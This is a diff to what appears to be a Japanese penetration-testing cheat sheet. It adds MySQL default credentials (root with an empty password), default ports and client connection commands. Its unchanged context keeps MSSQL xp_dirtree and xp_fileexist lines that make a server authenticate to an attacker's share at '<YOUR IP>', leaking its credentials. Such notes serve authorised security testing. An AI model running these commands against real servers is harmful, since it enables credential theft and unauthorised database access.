@@ -34,6 +34,21 @@ EXEC xp_dirtree '\\<YOUR IP>\<Share>'
 EXEC xp_fileexist '\\<YOUR IP>\<Share>'
 ```
 # MySQL
+## Default account
+root
+## Default password
+
+## Default Port
+3306, 33060
+## Connection
+`-p`はパスワードとの間にスペース不要。入力しない場合は要求される。  
+`-e`を使うとローカルのMySQLに接続すると同時にクエリを実行する。  
+`-ssl=0`を使うとTLS/SSL接続をしないまま接続する。
+```
+mysql -h <Target> -P <Port> -u <User> -p<Password>
+mysql -h <Target> -P <Port> -u <User> -p
+mysql -u <User> -p<Password> -e '<Query>;'
+```
 # PostgreSQL
 # Redis
 # MongoDB
